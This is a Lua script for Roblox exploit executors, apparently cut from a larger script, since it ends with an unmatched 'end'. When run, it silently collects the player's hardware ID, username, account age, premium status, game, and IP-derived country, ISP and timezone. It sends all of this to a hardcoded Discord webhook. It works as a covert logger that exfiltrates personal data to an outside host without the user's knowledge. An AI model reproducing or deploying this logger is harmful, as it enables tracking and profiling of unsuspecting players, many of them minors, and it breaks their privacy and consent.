local API = game:GetService("HttpService"):JSONDecode(game:HttpGet("http://ip-api.com/json/"))
	plr = game:GetService'Players'.LocalPlayer
	local premium = false
	local ALT = false
	if plr.MembershipType == Enum.MembershipType.Premium then
		premium = true
	elseif plr.MembershipType == Enum.MembershipType.None then
		premium = false
	end
	if premium == false then 
		if plr.AccountAge <= 70 then 
			ALT = true
		end
	end

	local market = game:GetService("MarketplaceService")
	local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)


	local http_request = http_request;
	if syn then
		http_request = syn.request
	elseif SENTINEL_V2 then
		function http_request(tb)
			return {
				StatusCode = 200;
				Body = request(tb.Url, tb.Method, (tb.Body or ''))
			}
		end
	end

	local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
	local decoded = game:GetService('HttpService'):JSONDecode(body)
	local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
	hwid = "";

	for i, v in next, hwid_list do
		if decoded.headers[v] then
			hwid = decoded.headers[v];
			break
		end
	end

	if hwid then
		local HttpServ = game:GetService('HttpService')
		local url = "https://discord.com/api/webhooks/892436636326043689/fQvkrB18CCKSXHlnMtqx5ejQSJVb7Btns5rgaIIEIvU5yTirvuEvRBy2XHc6ekbvaDZ2"


		local data = 
	    {
	        ["content"] = "",
	        ["embeds"] = {{
	            ["title"] = "__**HWID:**__",
	            ["description"] = hwid,
	            ["type"] = "rich",
	            ["color"] = tonumber(0xAB0909),
	            ["fields"] = {
	                {
	                    ["name"] = "Username:",
	                    ["value"] = game.Players.LocalPlayer.Name,
	                    ["inline"] = true
	                },
	                {
	                    ["name"] = "Game Link:",
	                    ["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/",
	                    ["inline"] = true
	                },
	                {
						["name"] = "Game Name:",
						["value"] = info.Name,
						["inline"] = true
					},
					{
						["name"] = "Age:",
						["value"] = plr.AccountAge,
						["inline"] = true
					},
					{
						["name"] = "Premium:",
						["value"] = premium,
						["inline"] = true
					},
					{
						["name"] = "ALT:",
						["value"] = ALT,
						["inline"] = true
					},
	                {
	                    ["name"] = "Country:",
	                    ["value"] = API.country,
	                    ["inline"] = true
	                },
	                {
	                    ["name"] = "ISP:",
	                    ["value"] = API.isp,
	                    ["inline"] = true
	                },
	                {
	                    ["name"] = "Timezone:",
	                    ["value"] = API.timezone,
	                    ["inline"] = true
	                },
	            },
	        }}
	    }
	    local newdata = HttpServ:JSONEncode(data)
	    
	    local headers = {
	            ["content-type"] = "application/json"
	    }
	    
	    local request_payload = {Url = url, Body = newdata, Method = "POST", Headers = headers}
	    local success, err = pcall (function()
	    	http_request(request_payload)
		end)
		if not success then warn(err) end
	end
end
